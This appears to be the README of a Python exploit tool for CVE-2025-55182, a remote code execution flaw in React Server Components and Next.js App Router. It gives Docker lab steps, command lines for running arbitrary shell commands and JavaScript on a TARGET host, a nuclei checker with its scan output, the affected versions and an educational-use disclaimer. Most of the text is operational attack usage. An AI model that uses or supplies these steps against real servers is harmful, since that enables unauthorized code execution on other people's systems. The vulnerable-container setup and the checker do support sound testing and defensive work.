# CVE-2025-55182 - React Server Components RCE Exploit

Python CLI exploit for CVE-2025-55182, a critical RCE vulnerability in React Server Components via `react-server-dom-webpack`.

**Based on:** [ejpir/CVE-2025-55182-poc](https://github.com/ejpir/CVE-2025-55182-poc)

## Quick Start

### Docker Testing

```bash
# Unpack src.zip
zip -r src.zip src

# Build and run vulnerable container
docker build -t cve-2025-55182-vuln .
docker run -d -p 3002:3002 --name cve-2025-55182 cve-2025-55182-vuln
sleep 3

# Check vulnerability
python3 exploit.py CVE-2025-55182 --ip localhost --port 3002 --check

# Execute commands
python3 exploit.py CVE-2025-55182 --ip localhost --port 3002 --cmd "id"
python3 exploit.py CVE-2025-55182 --ip localhost --port 3002 --cmd "whoami"

# Cleanup
docker stop cve-2025-55182 && docker rm cve-2025-55182
```

## Usage

```bash
# Check vulnerability
python3 exploit.py CVE-2025-55182 --ip TARGET --port 3002 --check

# Execute command
python3 exploit.py CVE-2025-55182 --ip TARGET --port 3002 --cmd "COMMAND"

# Execute JavaScript
python3 exploit.py CVE-2025-55182 --url http://TARGET:3002 --code "Math.PI * 2"
```

## Checker with nuclei (no RCE, only with Math.PI)
```bash
# Check vulnerability
nuclei -t cve-2025-55182.yaml -u http://localhost:3005

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.4.10

		projectdiscovery.io

[INF] Current nuclei version: v3.4.10 (outdated)
[INF] Current nuclei-templates version: v10.3.4 (latest)
[INF] New templates added in latest release: 0
[INF] Templates loaded for current scan: 1
[WRN] Loading 1 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[CVE-2025-55182] [http] [critical] http://localhost:3005/formaction
[INF] Scan completed in 14.991675ms. 1 matches found.
```


## Affected Versions

- `react-server-dom-webpack`: 19.0.0, 19.1.0, 19.1.1, 19.2.0
- `Next.js`: 15.x, 16.x (App Router)

## Disclaimer

**FOR EDUCATIONAL AND AUTHORIZED TESTING PURPOSES ONLY**
